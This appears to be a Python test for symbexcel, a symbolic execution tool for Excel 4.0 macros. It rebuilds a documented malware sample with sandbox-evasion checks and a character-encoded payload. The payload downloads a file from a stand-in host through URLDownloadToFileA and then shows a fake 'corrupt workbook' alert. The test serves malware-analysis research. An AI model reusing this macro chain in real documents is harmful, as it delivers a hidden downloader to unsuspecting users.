#!/usr/bin/env python3

import IPython

from symbexcel import SimulationManager

if __package__:
    from . import common
else:
    import common


# SEE https://blogs.vmware.com/networkvirtualization/2020/10/evolution-of-excel-4-0-macro-weaponization-continued.html/
def test_cluster16():
    cells = {
        'A1': (None, '=FORMULA("\'"&TEXT(INT(APP.MAXIMIZE())+95,"0"), R1C2)'),
        'A2': (None, '=FORMULA("\'"&TEXT(INT(GET.WORKSPACE(14)>390)+131,"0"), R2C2)'),
        'A3': (None, '=FORMULA("\'"&TEXT(INT(GET.WORKSPACE(42))+125,"0"), R3C2)'),
        'A4': (None, '=FORMULA("\'"&TEXT(INT(GET.WORKSPACE(19))+121,"0"), R4C2)'),
        'A5': (None, '=FORMULA("\'"&TEXT(INT(GET.WORKSPACE(13)>800)+120,"0"), R5C2)'),
        'A6': (None, '=NOW()'),
        'A7': (None, '=WAIT(NOW()+"00:00:01")'),
        'A8': (None, '=NOW()'),
        'A9': (None, '=FORMULA("\'"&TEXT(INT((R8C1-R6C1)*100000>1)+116,"0"), R6C2)'),

        'A10': (None, '=GOTO(C1)')
    }

    # assume all true: key=A1:A6
    key = [96, 132, 126, 122, 121, 117]
    keylen = len(key)
    payload = ['=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),,GOTO(R4C5))',
               '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://malicious.com/wp-data.php","lIYr.txt",0,0)',
               '=IF(R2C5<>0,,GOTO(R4C5))',
               '=ALERT("The workbook cannot be opened or repaired by Microsoft Excel because it\'s corrupt.")',
               '=CLOSE(FALSE)']

    first_stage_c = 'E'
    first_stage_r = 1
    for i, macro in enumerate(payload):
        concat_string = '&'.join(f'CHAR({ord(c)+key[j%keylen]}-INT(B{j%keylen + 1}))' for j, c in enumerate(macro))
        cells[f'C{i+1}'] = (None, f'=FORMULA({concat_string}, {first_stage_c}{first_stage_r+i})')

    cells[f'C{len(payload)+1}'] = (None, f'=GOTO({first_stage_c}{first_stage_r})')

    excel_doc = common.get_excel_doc(cells)
    simgr = SimulationManager(excel_doc=excel_doc, keep_predecessors=None)

    # cheat
    # simgr.one_active.environment['workspace'][13] = 801
    # simgr.one_active.environment['workspace'][14] = 391
    # simgr.one_active.environment['workspace'][19] = True
    # simgr.one_active.environment['workspace'][42] = True

    simgr.run(find=lambda s: s.address in common.BREAKPOINTS)

    assert len([s for s in simgr.deadended if not s.error]) == 3
    assert simgr.deadended[0].history[-3].formula == '=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),,GOTO(R4C5))'
    assert simgr.deadended[1].history[-3].formula == '=IF(R2C5<>0,,GOTO(R4C5))'
    assert simgr.deadended[2].history[-3].formula == '=IF(R2C5<>0,,GOTO(R4C5))'

    if common.INTERACTIVE:
        IPython.embed()


def main():
    test_cluster16()


if __name__ == '__main__':
    common.parse_args()
    main()
